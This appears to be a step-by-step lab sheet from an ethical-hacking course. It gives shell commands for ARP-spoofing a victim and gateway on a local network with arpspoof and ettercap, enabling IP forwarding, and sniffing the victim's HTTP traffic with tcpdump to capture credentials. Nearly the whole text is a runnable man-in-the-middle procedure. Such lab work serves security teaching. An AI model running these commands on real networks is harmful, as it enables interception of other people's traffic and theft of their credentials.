# EHPT Lab 5 – ARP Spoofing & Sniffing
# Tools: arpspoof, ettercap, tcpdump
# Run as root on Kali Linux

# STEP 1: Install tools
sudo apt install dsniff ettercap-text-only tcpdump -y

# STEP 2: Check IP forwarding status
cat /proc/sys/net/ipv4/ip_forward

# STEP 3: Enable IP forwarding (MUST do before arpspoof)
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward    # Confirm = 1

# STEP 4: Find network details
ip addr show                          # Your IP and interface
arp -n                                # ARP table
ip route | grep default               # Gateway IP

# Example values (replace with yours):
# Interface: wlan0 or eth0
# Your IP:   192.168.1.37
# Victim IP: 192.168.1.100
# Gateway:   192.168.1.1

# STEP 5: ARP Spoof – tell victim that YOU are the gateway
# Open Terminal 1:
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
# This sends: "I am 192.168.1.1" to victim 192.168.1.100

# STEP 6: ARP Spoof – tell gateway that YOU are the victim
# Open Terminal 2:
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100
# This sends: "I am 192.168.1.100" to gateway 192.168.1.1

# STEP 7: Sniff traffic using tcpdump
# Open Terminal 3:
sudo tcpdump -i wlan0 -n host 192.168.1.100
# Filter HTTP only:
sudo tcpdump -i wlan0 -A -s 0 'tcp port 80 and host 192.168.1.100'

# STEP 8: Use Ettercap CLI for combined ARP + sniffing
sudo ettercap -T -q -M arp:remote /192.168.1.100// /192.168.1.1//
# -T = text mode, -q = quiet, -M arp:remote = ARP MITM

# STEP 9: Verify ARP spoof worked
arp -n
# Victim's gateway entry should show YOUR MAC address

# STEP 10: Stop and restore
# Press Ctrl+C to stop arpspoof in both terminals
# Restore IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# STEP 11: View captured traffic
sudo tcpdump -r capture.pcap 2>/dev/null || echo "No saved capture file"

# Conclusion:
# ARP spoofing was performed using arpspoof to position attacker as MITM.
# IP forwarding allowed traffic to pass through (so victim doesn't lose connection).
# tcpdump and Ettercap captured HTTP credentials and plaintext data in transit.
# This attack exploits ARP's lack of authentication in LAN environments.
